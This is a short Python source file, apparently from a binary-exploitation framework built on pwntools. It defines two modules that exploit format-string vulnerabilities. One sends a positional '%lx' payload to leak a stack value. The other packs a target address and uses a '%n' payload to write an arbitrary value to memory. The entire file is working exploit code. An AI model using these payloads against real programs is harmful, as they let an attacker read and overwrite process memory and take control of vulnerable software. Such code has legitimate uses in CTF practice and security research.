from typing import Optional

from abstract.module import AbstractModule
from core.targetbase import TargetBase
from loguru import logger
from pwn import p64


class FormatStringMagicRead(AbstractModule):
    @classmethod
    def execute(cls, target: TargetBase, position: int, *args, **kwargs) -> Optional[int]:
        logger.info(f"Running {cls.__name__} module")
        payload = f'%{position}$lx'.encode()
        response = target.run_main(payload)
        return int(response, 16)


class FormatStringMagicWrite(AbstractModule):
    @classmethod
    def execute(cls, target: TargetBase, position: int, value: int, address: int, *args, **kwargs) -> Optional[bool]:
        logger.info(f"Running {cls.__name__} module")
        payload = p64(address) + f'%{value-8}x%{position}$n'.encode()
        target.run_main(payload)